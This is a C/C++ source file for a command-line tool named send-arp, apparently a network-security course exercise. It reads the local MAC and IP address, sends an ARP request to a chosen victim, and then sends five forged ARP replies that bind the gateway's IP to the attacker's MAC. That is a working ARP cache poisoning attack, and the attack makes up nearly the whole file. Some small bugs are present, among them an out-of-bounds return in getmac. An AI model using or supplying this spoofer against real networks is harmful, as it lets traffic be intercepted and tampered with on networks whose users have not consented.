#include <net/if.h>
#include <net/if_arp.h>
#include <net/ethernet.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <cstdio>
#include <pcap.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "arp.h"
#include "ip.h"

uint8_t mac_addr[ETHER_ADDR_LEN];

int getmac(char* mac){
    struct ifreq ifrmac;
    int socketOpen1;
    int interface1;

    socketOpen1 = socket(AF_INET, SOCK_DGRAM,0);
    if(socketOpen1 < 0) {
        printf("skcketOpen Error\n");
        return -1;
    }

    strncpy(ifrmac.ifr_name, mac, IFNAMSIZ);

    interface1 = ioctl(socketOpen1, SIOCGIFHWADDR, &ifrmac);
    if (interface1 < 0) {
        printf("interface Error\n");
        close(socketOpen1);
        return -1;
    }

    memcpy(mac_addr, ifrmac.ifr_hwaddr.sa_data, ETHER_ADDR_LEN);
    close(socketOpen1);
    return mac_addr[ETHER_ADDR_LEN];
}

#pragma pack(push, 1)
struct EthArpPacket {
    ethernet_hdr eth;
    arp_hdr arp;
};
#pragma pack(pop)

void usage() {
    printf("syntax : send-arp <interface> <sender ip> <target ip>\n");
    printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
        usage();
        return -1;
    }
    getmac(argv[1]);

    struct ifreq ifrIp;
    int socketOpen2;
    int interface2;
    char* IP_addr;

    socketOpen2 = socket(AF_INET, SOCK_DGRAM,0);
    if(socketOpen2 < 0) {
        printf("skcketOpen Error\n");
        return -1;
    }
    ifrIp.ifr_addr.sa_family = AF_INET;
    strncpy(ifrIp.ifr_name, argv[1], IFNAMSIZ);

    interface2 = ioctl(socketOpen2, SIOCGIFADDR, &ifrIp);
    if (interface2 < 0) {
        printf("interface Error\n");
        close(socketOpen2);
        return -1;
    }
    IP_addr = inet_ntoa(((struct sockaddr_in *)&ifrIp.ifr_addr)->sin_addr);
    printf("My IP addres : %s\n",IP_addr);
    close(socketOpen2);


    printf("My MAC addres : %02x:%02x:%02x:%02x:%02x:%02x\n",
           mac_addr[0],mac_addr[1],
            mac_addr[2],mac_addr[3],
            mac_addr[4],mac_addr[5]);

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    EthArpPacket ReqReppacket;

    memset(ReqReppacket.eth.ether_dhost, 0xFF, sizeof(mac_addr));

    memcpy(&ReqReppacket.eth.ether_shost, &mac_addr, sizeof(mac_addr));

    ReqReppacket.eth.ether_type = htons(ETHERTYPE_ARP);

    ReqReppacket.arp.hrd_ = htons(ARPHRD_ETHER);
    ReqReppacket.arp.pro_ = htons(ETHERTYPE_IP);
    ReqReppacket.arp.hln_ = 6;
    ReqReppacket.arp.pln_ = 4;
    ReqReppacket.arp.op_ = htons(ARPOP_REQUEST);

    memcpy(&ReqReppacket.arp.smac, &mac_addr, sizeof(mac_addr)); //my

    ReqReppacket.arp.sip = htonl(Ip(IP_addr));

    memset(ReqReppacket.arp.tmac, 0x00, sizeof(ReqReppacket.arp.tmac)); //you

    ReqReppacket.arp.tip = htonl(Ip(argv[2]));


    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&ReqReppacket) ,sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    struct EthArpPacket* etharp;

    while(true) {
        struct pcap_pkthdr* header;
        const u_char* packet; //packet start point
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }


        etharp = (struct EthArpPacket* )packet;

        if(etharp->eth.ether_type != htons(ETHERTYPE_ARP)) continue;
        if(etharp->arp.op_ != htons(ARPOP_REPLY)) continue;
        if(etharp->arp.sip != htonl(Ip(argv[2]))) continue;

        memcpy(&ReqReppacket.eth.ether_dhost, &etharp->eth.ether_shost, sizeof(mac_addr));
        memcpy(&ReqReppacket.arp.tmac, &etharp->arp.smac, sizeof(mac_addr));
        ReqReppacket.arp.op_ = htons(ARPOP_REPLY);
        ReqReppacket.arp.sip = htonl(Ip(argv[3])); // gateway

        for(int sned = 0; sned<5; sned++){
            int reply = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&ReqReppacket) ,sizeof(EthArpPacket));
            if (reply != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", reply, pcap_geterr(handle));
            }
        }
        break;
    }
    pcap_close(handle);
}

